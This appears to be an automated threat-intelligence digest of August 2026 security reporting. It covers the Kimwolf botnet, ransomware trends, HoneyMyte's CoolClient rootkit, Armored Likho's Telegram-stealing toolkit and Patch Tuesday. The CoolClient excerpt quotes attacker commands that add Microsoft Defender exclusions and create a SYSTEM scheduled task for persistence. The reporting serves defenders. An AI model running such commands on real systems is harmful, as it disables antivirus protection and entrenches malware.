- Published: 2026-08-17T04:52:58+00:00
- Link: https://risky.biz/RBNEWS601/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
The EU publishes its upcoming cybersecurity standards, hackers breach France’s tax agency, threat actors exploit a GeoServer zero-day hours after disclosure, and an exploit unlocks old AMD CPUs with one instruction.
```

#### Full body

```
Risky Bulletin Podcast August 17, 2026 Risky Bulletin: The EU publishes its upcoming cybersecurity standards Presented by Catalin Cimpanu News Editor Claire Aird Newsreader The EU publishes its upcoming cybersecurity standards, hackers breach Franceâs tax agency, threat actors exploit a GeoServer zero-day hours after disclosure, and an exploit unlocks old AMD CPUs with one instruction. Your browser does not support the audio element. Risky Bulletin: The EU publishes its upcoming cybersecurity standards â¶ 0:00 / 8:37 Subscribe Brought to you by Socket Secure your dependencies. Ship with confidence. Show notes Risky Bulletin: The EU publishes its upcoming cybersecurity standards
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: The EU publishes its upcoming cybersecurity standards
  - Published: 2026-08-17T04:52:58+00:00
  - Link: https://risky.biz/RBNEWS601/
  - Summary: The EU publishes its upcoming cybersecurity standards, hackers breach France’s tax agency, threat actors exploit a GeoServer zero-day hours after disclosure, and an exploit unlocks old AMD CPUs with one instruction.

### Cluster 1e15301923 — score 10

- Title: Kimwolf v7: An Evolution of the Kimwolf Botnet
- Source: Unit 42 (threat_research_primary)
- Published: 2026-08-11T10:00:16+00:00
- Link: https://unit42.paloaltonetworks.com/kimwolf-v7-botnet-malware/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- affected_products: Palo Alto Networks
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ddos
- affected_products: Palo Alto Networks
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Discover how Kimwolf v7 targets Android IoT devices with HTTP/2 DDoS fingerprinting, Ethereum ENS C2 resolution and Tor backup routing. The post Kimwolf v7: An Evolution of the Kimwolf Botnet appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Kimwolf v7: An Evolution of the Kimwolf Botnet 11 min read Related Products Advanced DNS Security Advanced URL Filtering Advanced WildFire Cloud-Delivered Security Services IoT Security Unit 42 Incident Response By: Asher Davila Chris Navarrete Doel Santos Published: August 11, 2026 Categories: Malware Threat Research Tags: Android APK Ethereum HTTP IoT botnets Kimwolf v7 Linux RPC Spoofing Share Content Warning We are providing a content warning because the following article contains usage of a racial slur by a threat actor, which Unit 42 does not condone in any instance. We have partially redacted the racial slur, but preserved some references to it in order to provide researchers with the ability to identify it and check IoCs as needed. Executive Summary We identified a new version (v7) of the Kimwolf Android/internet-of-things (IoT) botnet. This version upgrades its distributed denial-of-service (DDoS) attack capabilities and the resilience of its command-and-control (C2) infrastructure. Kimwolf primarily affects Android TV boxes and set-top boxes. Kimwolf v7 adds an HTTP/2-based DDoS flood that constructs complete browser fingerprints. This makes attack traffic more difficult to distinguish from legitimate browsing. The threat’s binary includes five hard-coded public Ethereum-based endpoints for resolving Ethereum Name Service (ENS) domains. ENS is a blockchain-based naming system used to obtain C2 addresses. Kimwolf also carries a hard-coded Tor .onion hidden service as a backup and a local proxy architecture for flexible routing between clearnet and Tor. The malware developers added this function to directly respond to C2 server takedown efforts in December 2025. We discovered this variant on Feb. 3, 2026, through threat hunting that followed public disclosures by XLab, Synthient, Infoblox, Cloudflare and others. Palo Alto Networks customers are better protected through the following products and services: Advanced URL Filtering and Advanced DNS Security Advanced WildFire Device Security If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Malware , Botnet , DDoS Background The Kimwolf botnet (also tracked as AISURU ) has been active since August 2024. It initially targeted Linux IoT devices under the AISURU name. The botnet transitioned to Android TV boxes around August 2025. This reflects two separate codebases under the same operators. AISURU covers the Linux IoT variants, and Kimwolf covers variants targeting Android. Kimwolf spreads by misusing residential proxy services to reach unauthenticated Android Debug Bridge (ADB) instances on local networks. Some Android TV boxes ship with ADB enabled on port 5555. Once attackers tunnel through a proxy endpoint into the local network, they can install the malware without any authentication. Kimwolf Sample Overview The Kimwolf sample we analyzed as a baseline is a statically linked ARM Executable and Linkable Format (ELF) binary. The file was compiled with the Android Native Development Kit (NDK) using Clang and uses Bionic libc. It statically links BoringSSL for Transport Layer Security (TLS) operations and nghttp2 for HTTP/2 functionality. The binary is stripped but retains some symbol information. It is not uncommon for malware authors to use racial slurs in their code. The Kimwolf malware family has historically included racial slurs. In our discussion of the v7 variant, we have partially redacted these slurs, but have left enough information present that defenders could identify the variant and check for IoCs. Previous Kimwolf builds used the internal version strings such as n[redacted]boxv4 and n[redacted]boxv5 , establishing the naming pattern for the family. The version string n [redacted] boxv7 , shown in Figure 1, identifies this sample as version 7. The binary creates a Unix domain socket @n[redacted]boxv7 to ensure only one
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Kimwolf v7: An Evolution of the Kimwolf Botnet
  - Published: 2026-08-11T10:00:16+00:00
  - Link: https://unit42.paloaltonetworks.com/kimwolf-v7-botnet-malware/
  - Summary: Discover how Kimwolf v7 targets Android IoT devices with HTTP/2 DDoS fingerprinting, Ethereum ENS C2 resolution and Tor backup routing. The post Kimwolf v7: An Evolution of the Kimwolf Botnet appeared first on Unit 42 .

### Cluster 2a12c51464 — score 10

- Title: The State of Ransomware Q2 2026
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-13T12:54:35+00:00
- Link: https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach, ransomware_extortion
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft, data_breach
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the past year, the ransomware conversation has centered on concentration: a handful of dominant RaaS operations controlling most of the damage, and a shrinking pool of active groups fighting over the same territory. The State of Ransomware Q2 2026 report from Check Point Research shows that picture starting to shift. The leaders are still winning, but […] The post The State of Ransomware Q2 2026 appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 18 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 466 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 421 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 The State of Ransomware Q2 2026 August 13, 2026 https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/ For the past year, the ransomware conversation has centered on concentration: a handful of dominant RaaS operations controlling most of the damage, and a shrinking pool of active groups fighting over the same territory. The State of Ransomware Q2 2026 report from Check Point Research shows that picture starting to shift. The leaders are still winning, but the road to joining them has gotten a great deal shorter. Key observed findings The ecosystem stayed concentrated even as its tail widened considerably. The top 10 groups accounted for 57.6% of all victims, down from 71% in Q1, while the number of active groups climbed from 71 to 93, a new high for the period tracked in this report. Victim volume held at an elevated baseline and did not meaningfully change QoQ. Data leak sites recorded 2,139 victims in Q2, essentially flat versus Q1 (up 0.8%) and up 33% year over year, keeping pace with the highs set through 2025. Qilin and The Gentlemen fought a close race for the top spot all quarter. Qilin remained the most prolific operator for a fourth straight quarter with 279 victims, though its count fell 17%, while The Gentlemen surged 62% to 269 victims and actually outpaced Qilin during the month of June. An internal leak gave an unprecedented look inside The Gentlemen’s operation. Chat logs and platform data exposed a core team of roughly nine operators supported by a broader affiliate base, along with confirmation that the group used AI coding assistants to build its ransomware management panel in about three days, genuine first party evidence of AI accelerating malicious tooling development. Ransom payment rates fell to a multi year low near 23%, continuing a six year decline from 85% in 2019. Even so, on chain ransomware payments still exceeded $820 million in 2025, and the payer market itself is splitting: average payments are rising even as the median falls, a sign that large enterprises keep paying heavily while the mid market increasingly holds firm or settles small. Law enforcement concentrated its Q2 efforts on shared infrastructure rather than individual groups. Actions took down a cryptocurrency laundering platform used by multiple ransomware actors, prompted sanctions against major Iranian digital asset exchanges, dismantled a malware signing service abused by several RaaS operations, and disrupted large infostealer and VPN anonymization networks that many groups depend on at once. The geographic picture shifted meaningfully. The US share of victims fell from 50% to 42% quarter over quarter, largely because the quarter’s fastest growing groups, including The Gentlemen and the newly active Krybit, target the US far less often than the ecosystem average. The exploitation window kept narrowing, with AI increasingly cited as the accelerant. Vulnerabilities are now being weaponized within hours to days of disclosure, lowering the cost of exploit development and giving ransomware operators one more edge in the race to reach victims first. To read the full findings, access the State of Ransomware Q2 2026 report from Check Point Research here . GO UP BACK TO ALL POSTS POPULAR POSTS Artificial Intelligence ChatGPT Check Point Research Publications OPWNAI : Cybercriminals Starting to Use ChatGPT Check Point Research Publications Threat Research Hacking Fortnite Accounts Artificial Intelligence ChatGPT Check Point Research Publications OpwnAI: AI That Can Save the Day or HACK it Away BLOGS AND PUBLICATIONS Check Point Research Public
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: The State of Ransomware Q2 2026
  - Published: 2026-08-13T12:54:35+00:00
  - Link: https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/
  - Summary: For the past year, the ransomware conversation has centered on concentration: a handful of dominant RaaS operations controlling most of the damage, and a shrinking pool of active groups fighting over the same territory. The State of Ransomware Q2 2026 report from Check Point Research shows that picture starting to shift. The leaders are still winning, but […] The post The State of Ransomware Q2 2026 appeared first on Check Point Research .

### Cluster 21cbe0b5fa — score 10

- Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-08-14T09:00:14+00:00
- Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: Mustang Panda
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: Mustang Panda
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
```

#### Full body

```
Table of Contents Introduction Technical analysis CoolClient components First stage: libngs.dll Second stage: loadcert.ini (before synchost.exe injection) Command handler Establishing AutoRun persistence Process injection into synchost.exe Service installation Administrator privilege check Elevated relaunch and UAC bypass Second stage: loadcert.ini (Injected Execution) Kernel-Mode driver deployment Driver initialization Cert.ini process injection Msagent.sys driver Driver configuration Preparation for process hiding Process, object, and image load callbacks Object callbacks Process and image load callbacks MiniFilter registration Registry callback registration IOCTL command dispatcher Kernel module enumeration and hiding Nsiproxy hooking and data filtering Victimology Attribution Conclusion IOCs Authors Fareed Radzi Introduction CoolClient is a backdoor family attributed to the HoneyMyte APT group (also known as Mustang Panda) that has been used in their cyber-espionage campaigns targeting organizations across Asia and Russia. It supports such capabilities as keylogging, clipboard theft, credential harvesting, file management, system reconnaissance, and plugin-based extensions. Since its first public disclosure by Sophos in 2022 and subsequent analysis by Trend Micro in 2023 , CoolClient has continued to evolve. In 2025 , we analyzed a newer variant that introduced clipboard theft and HTTP traffic interception for credential harvesting. In late 2025 and 2026, our latest investigation reveal another major evolution. The newest CoolClient variant can deploy a signed kernel-mode driver as a Windows service and communicate with it through IOCTL requests. The driver enhances the malware’s stealth by hiding the CoolClient process, protecting related files and registry entries, and preventing them from being inspected or modified. The overall design is comparable to the kernel-mode enhancements previously observed in ToneShell , but the CoolClient driver exposes dedicated IOCTL handlers that allow the user-mode backdoor to communicate directly with the driver. We have observed this updated CoolClient variant and its accompanying driver in intrusions across multiple countries in Asia, including Pakistan, Mongolia, and Myanmar. Technical analysis In the observed campaign targeting Myanmar, HoneyMyte used PlugX as the initial post-compromise implant to deploy the CoolClient components. Before deploying the malware, the actor added both a folder exclusion and a file exclusion to Microsoft Defender for the fake Windows Defender installation directory and the renamed sideloader executable ( defender.exe ). wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender" wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender\defender.exe" 1 2 wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender" wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender\defender.exe" The actor then created a fake Windows Defender installation directory, copied the CoolClient components into it, and renamed a legitimate Sangfor executable, usually named Sang.exe , to defender.exe to serve as the DLL sideloader. xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" /a /s /v /e /f 1 xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" / a / s / v / e / f Persistence was established through a scheduled task that launched defender.exe with SYSTEM privileges during system startup. schtasks /create /sc onstart /tn "\Microsoft\Windows\Windows Defender Advanced Threat Protection Service" /tr "\"$p
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
  - Published: 2026-08-14T09:00:14+00:00
  - Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
  - Summary: Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.

### Cluster 1e8cbb1e90 — score 10

- Title: Armored Likho expands its cyber-espionage toolkit
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-08-13T08:00:15+00:00
- Link: https://securelist.com/armored-likho-still-toolkit/121033/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- affected_industries: education, government
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- affected_industries: government, education
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.
```

#### Full body

```
Table of Contents Background Initial infection Still Sync How it works Telegram data collection Still Audio The eavesdropping process Infrastructure Victims Attribution Takeaways Indicators of compromise Authors Konstantin Isakov In May 2026, we discovered a new cyber-espionage campaign by the Armored Likho group, also known as Eagle Werewolf, that targets private individuals and organizations across various industries in Russia, including major corporations, the public sector, IT, and education. The attackers used a fake app as bait that mimics a service for donations. However, the most interesting part of this campaign isn’t the initial infection method – it’s the malicious implants the attackers use for cyber-espionage. We’ve written previously about recent Armored Likho attacks, but our analysis shows that the campaign discussed below has more in common with the group’s activity from February . That said, the attackers have significantly expanded their arsenal. During our research, we found a new cyber-espionage toolkit written in Rust: the Still Toolkit . One of its components, Still Sync , steals Telegram session data to gain ongoing access to the victim’s account. With this stolen data, attackers can leverage the Telegram API to automatically pull chat logs, media files, and other information from the account. The second component, Still Audio , is an implant for covert audio surveillance. It analyzes the incoming audio stream, automatically detects speech, records conversations, and sends the recordings to a command-and-control server. In this article, we’ll look at the initial infection method, how the new Still Toolkit components are built, and the technical details of how they operate. Kaspersky products detect this threat as Trojan.Win64.Agent.* and HEUR:Backdoor.Win32.Generic . Background Armored Likho’s malicious activity has been documented several times before: in November 2024, and in February and July 2026. The current campaign shows significant overlap with the November and February campaigns, which used malicious droppers disguised as documents and applications related to Starlink activation or fundraising efforts as the initial infection vector. This campaign also uses fundraising as its lure. At the same time, our research uncovered a number of new tools that point to the attackers expanding their capabilities. Initial infection The infection chain starts with an app that mimics a donation service. As of this writing, the app distribution method remains unknown. During our research, however, we obtained several samples posing as apps from different Russian foundations. In reality, the app is a dropper. Its developers wrote it in Rust on top of the popular Tauri framework, and it has a graphical interface designed to deceive the user. After launch, it displays a login form that asks for a password, presumably one the attackers supplied. The login form After the user enters a valid password, they see a catalog of donatable items. The app pulls item and category information from orderapiserver[.]info through the public/categories and public/products endpoints . A clickable catalog makes the app look legitimate. While the user browses the items, the dropper quietly decrypts and launches the payload for the next stage in the background. Our analysis shows that the mechanism for decrypting the payload and launching subsequent stages hasn’t changed since the February campaign. However, we found a new cyber-espionage toolkit – the Still Toolkit – made up of two components: Still Sync and Still Audio. Still Sync Still Sync is a stealer written in Rust that steals Telegram session data. However, its capabilities don’t stop there. With this stolen data, Sync can log in to the victim’s account and pull messages and media files through the Telegram API. Architecturally, Sync is an asynchronous application based on the Tokio library. It talks to the server over gRPC and serializes messages with FlatBuffers . It support
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Armored Likho expands its cyber-espionage toolkit
  - Published: 2026-08-13T08:00:15+00:00
  - Link: https://securelist.com/armored-likho-still-toolkit/121033/
  - Summary: Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.

### Cluster 452d902ac4 — score 10

- Title: Curiouser and Curiouser
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-08-13T18:00:18+00:00
- Link: https://blog.talosintelligence.com/curiouser-and-curiouser/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: retail_ecommerce
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: retail_ecommerce
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
In this edition of the Threat Source newsletter, William reflects on the “Make Hazel a Hacker” segment in Beers with Talos, and how cybersecurity is a field where questions can lead to multiple correct answers.
```

#### Full body

```
Curiouser and Curiouser By William Largent Thursday, August 13, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. “Experiment is the mother of knowledge.” ― Madeleine L'Engle, A Wrinkle in Time “Don't slide down the rabbit hole. The way down is a breeze, but climbing back's a battle.” ― Kate Morton, The Clockmaker's Daughter Hacker Summer Camp has come and gone, which means it’s time for you to start planning next year’s trip. I’m surely going to recap Camp Season, right? Nope. One of the things that I’ve really enjoyed lately is a segment on the Beers with Talos podcast that we call “Make Hazel a Hacker.” If you haven’t listened to it, this is a perfect time to start. Each episode we take a few minutes and pose a security question, term, or concept to Hazel and force her to come up with an idea or explanation on the spot. There are no parameters, so she’s faced with the entirety of information security — past, present, and future. I know, it’s insane. The craziest part is that (I think) Hazel came up with this idea and still volunteered to put herself in the line of fire. As we put Hazel’s feet to the fire, one of my favorite things happens: The rest of us listen in and offer our thoughts during her brainstorming process. Invariably, we’ve got three very different answers, ideas, hints, or directions for her. It’s surely maddening for Hazel, but to me, the best part of the discussion that inevitably follows is that although they’re all different, they’re all correct. For example, this past episode I asked her about a behavioral indicator (regarding “wallpaper.bmp”) that seems benign on its own, but can be interesting to use as a pivot for a threat hunt. We had various interesting angles to consider, backed by years of knowledge and experience. It gave us a good conversation, and that was a .bmp! One of the most nebulous things to learn in this field is that multiple things can be both different and correct. When you are making your decisions this week — whether it’s deciding on a new pivot in your hunting, what devices to prioritize in your patching and updating, or which books or online training to focus on — take a quick second and get a second, third, and fourth opinion. Then try something that’s outside of your normal wheelhouse but sounds good when it’s proposed. None of this is a solo sport. It’s a team game and the best plays come from a mix of perspectives, experiences, and mistakes. The “right” answer can wear many faces, and your ability to hold different truths will lead you to undiscovered territory, the rabbit hole where anomaly lives and breathes. So... welcome back from Vegas. Now go down a rabbit hole on a path you wouldn’t normally take because one of your friends (Joe) or your mortal enemy (Dave) told you that it would work. “She'd been to Narnia, Wonderland, Hogwarts, Dictionopolis. She had tessered, fallen through the rabbit hole, crossed the ice bridge into the unknown world beyond.” ― Anne Ursu, Breadcrumbs The one big thing Cisco Talos recently discovered "JWR," a previously undocumented, real-time phishing framework and likely variant of "The Outsider" phishing-as-a-service platform. JWR uses an open WebSocket connection that allows attackers to monitor keystrokes live and dynamically steer victims through fake checkout and login flows. Currently deployed via SMS lures impersonating regional toll and postal authorities, JWR enables operators to steal payment data, 2FA codes, identity documents, and device fingerprints. Why do I care? Because JWR is operator-driven in real time, attackers can actively bypass multi-factor authentication (MFA) by prompting victims for 2FA codes exactly when needed. The sheer volume of collected data gives threat actors a comprehensive identity profile primed for extensive follow-on fraud and network compromise. Furthermore, JWR's seamless integration with legitimate e-commerce platforms like Shopify makes these lures incre
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Curiouser and Curiouser
  - Published: 2026-08-13T18:00:18+00:00
  - Link: https://blog.talosintelligence.com/curiouser-and-curiouser/
  - Summary: In this edition of the Threat Source newsletter, William reflects on the “Make Hazel a Hacker” segment in Beers with Talos, and how cybersecurity is a field where questions can lead to multiple correct answers.

### Cluster b4927a86ad — score 10

- Title: Microsoft Patch Tuesday for August 2026 — Snort rules and prominent vulnerabilities
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-08-11T22:21:02+00:00
- Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-august-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Azure, Cisco, Microsoft SharePoint
- cve_ids: CVE-2026-62823, CVE-2026-62830, CVE-2026-62893, CVE-2026-65665, CVE-2026-68820
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Cisco, Microsoft SharePoint, Azure
- cve_ids: CVE-2026-68820, CVE-2026-62893, CVE-2026-65665, CVE-2026-62823, CVE-2026-62830
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft has released its monthly security update for August 2026, which includes 421 vulnerabilities affecting a range of products, including 62 that Microsoft marked as "critical."
```

#### Full body

```
Microsoft Patch Tuesday for August 2026 — Snort rules and prominent vulnerabilities By Cisco Talos Tuesday, August 11, 2026 18:21 Patch Tuesday Microsoft has released its monthly security update for August 2026, which includes 421 vulnerabilities affecting a range of products, including 62 that Microsoft marked as "critical." Microsoft notes that 1 of the vulnerabilities disclosed this month have been exploited in the wild CVE-2026-68820 is an elevation of privilege vulnerability affecting Windows Ancillary Function Driver for WinSock. A Use After Free vulnerability could allow an authorized attacker to elevate privileges locally. This vulnerability has a CVSS base score of 7.0. Out of 62 "critical" vulnerabilities, 40 are remote code execution (RCE) vulnerabilities. Microsoft considers exploitation of the following vulnerabilities more likely. CVE-2026-62893 is a remote code execution vulnerability affecting Windows Deployment Services TFTP Server. A Use After Free could allow an unauthorized attacker to execute code over a network. This vulnerability has a CVSS base score of 9.8. CVE-2026-65665 is a remote code execution vulnerability affecting Microsoft SharePoint Server. Deserialization of Untrusted Data could allow an authorized attacker to execute code over a network. This vulnerability has a CVSS base score of 8.8. CVE-2026-62823 is a remote code execution vulnerability affecting Windows DHCP Server. A Heap-based Buffer Overflow could allow an unauthorized attacker to execute code over an adjacent network. This vulnerability has a CVSS base score of 8.8. Microsoft considers exploitation of the following vulnerabilities less likely. CVE-2026-62830 is an elevation of privilege vulnerability affecting Azure SRE Agent. Missing Authorization could allow an authorized attacker to elevate privileges over a network. This vulnerability has a CVSS base score of 9.9. CVE-2026-50516 is an elevation of privilege vulnerability affecting Microsoft Azure Kubernetes Service. Missing Authentication for Critical Function could allow an unauthorized attacker to elevate privileges over a network. This vulnerability has a CVSS base score of 9.4. Three remote code execution vulnerabilities, CVE-2026-68794 , CVE-2026-68816 and CVE-2026-68804 , affect Microsoft Excel and have a CVSS base score of 7.8. An unauthorized attacker could execute code locally. CVE-2026-68794 is a Heap-based Buffer Overflow. CVE-2026-68816 is a Stack-based Buffer Overflow. CVE-2026-68804 involves a Numeric Truncation Error and a Heap-based Buffer Overflow. CVE-2026-62911 is an elevation of privilege vulnerability affecting Microsoft Exchange Server. Authentication Bypass by Capture-replay could allow an authorized attacker to elevate privileges over a network. This vulnerability has a CVSS base score of 8.0. Nine remote code execution vulnerabilities, CVE-2026-63515 , CVE-2026-65657 , CVE-2026-63532 , CVE-2026-64898 , CVE-2026-64903 , CVE-2026-64909 , CVE-2026-64910 , CVE-2026-64911 and CVE-2026-70130 , affect Microsoft Office and could allow an unauthorized attacker to execute code locally. CVE-2026-63515 involves an Out-of-bounds Read and an Integer Underflow (Wrap or Wraparound) and has a CVSS base score of 7.8. CVE-2026-65657 is a Use After Free and has a CVSS base score of 7.8. CVE-2026-63532 involves an Integer Overflow or Wraparound and a Heap-based Buffer Overflow and has a CVSS base score of 7.8. CVE-2026-64898 involves a Heap-based Buffer Overflow and an Integer Overflow or Wraparound and has a CVSS base score of 7.8. CVE-2026-64903 involves an Integer Overflow or Wraparound and a Heap-based Buffer Overflow and has a CVSS base score of 7.8. CVE-2026-64909 involves an Integer Underflow (Wrap or Wraparound), an Out-of-bounds Read and a Heap-based Buffer Overflow and has a CVSS base score of 7.8. CVE-2026-64910 is an Untrusted Pointer Dereference and has a CVSS base score of 7.8. CVE-2026-64911 involves an Integer Overflow or Wraparound and a Heap-based Buffer O
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Microsoft Patch Tuesday for August 2026 — Snort rules and prominent vulnerabilities
  - Published: 2026-08-11T22:21:02+00:00
  - Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-august-2026/
  - Summary: Microsoft has released its monthly security update for August 2026, which includes 421 vulnerabilities affecting a range of products, including 62 that Microsoft marked as "critical."

### Cluster af5513db44 — score 10

- Title: From Scanner Findings to Verifiable Web Application Risk
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-08-11T17:07:51+00:00
- Link: https://horizon3.ai/customer-story/cloud-native-webapp-security-validation/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how a cloud-native merchandise returns technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers evidence they could act on.
```

#### Full body

```
From Scanner Findings to Verifiable Web Application Risk Horizon3 Customer Stories Web application scanners can surface potential vulnerabilities. They don’t always prove what attackers can actually exploit or give developers the evidence they need to act. A cloud-native merchandise returns technology provider needed a better way to continuously validate application risk across an AWS-heavy environment while helping security and engineering teams reach the same conclusions faster. This customer story explores how the company expanded its use of NodeZero® from infrastructure validation into continuous autonomous WebApp pentesting, creating a shared, evidence-driven view of exploitable risk. Key Insight Traditional scanners and periodic pentests generated findings, but the security team needed stronger proof of what was truly exploitable and a better way to communicate that risk to developers. By adopting NodeZero and NodeZero WebApp, the organization gained: Continuous validation across cloud infrastructure and web applications Clearer visibility into exploitable application risk Evidence developers and security teams could evaluate together Greater insight into how credentials and cloud assets compound risk Scalable WebApp testing across a growing application portfolio Less reliance on abstract severity ratings and static reports What You’ll Learn Why traditional scanner findings can create friction between security and development teams How autonomous WebApp pentesting validates what is actually exploitable How attack-path evidence helps teams understand compounded cloud risk Why route-level proof can make application security findings easier for developers to act on How continuous testing fits an AWS-heavy, cloud-native operating model How security teams can move from interpreting scanner noise to reviewing verifiable evidence Why autonomous pentesting can create a shared view of risk across security and engineering Why It Matters Cloud-native environments change quickly. Applications evolve, infrastructure shifts, identities connect systems, and customer-facing services remain directly tied to the business. For lean security teams responsible for cloud, infrastructure, AppSec, privacy, and compliance, identifying another potential vulnerability isn’t enough. They need to know whether it can actually be exploited and give developers evidence that makes the path to remediation clear. This organization moved beyond periodic reports toward continuous, evidence-driven validation. After about a dozen early NodeZero tests, the team expanded to nearly 30 autonomous WebApp pentesting campaigns across more than 20 applications, creating a more practical way for security and engineering to understand and act on real risk. Download the customer story to see how a cloud-native technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers verifiable evidence they could act on. Download the customer story How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: From Scanner Findings to Verifiable Web Application Risk
  - Published: 2026-08-11T17:07:51+00:00
  - Link: https://horizon3.ai/customer-story/cloud-native-webapp-security-validation/
  - Summary: See how a cloud-native merchandise returns technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers evidence they could act on.

### Cluster 44f04ecb50 — score 10

- Title: Malware Crypting Services and the Threat Actors Who Sell Them
- Source: Recorded Future (threat_research_primary)
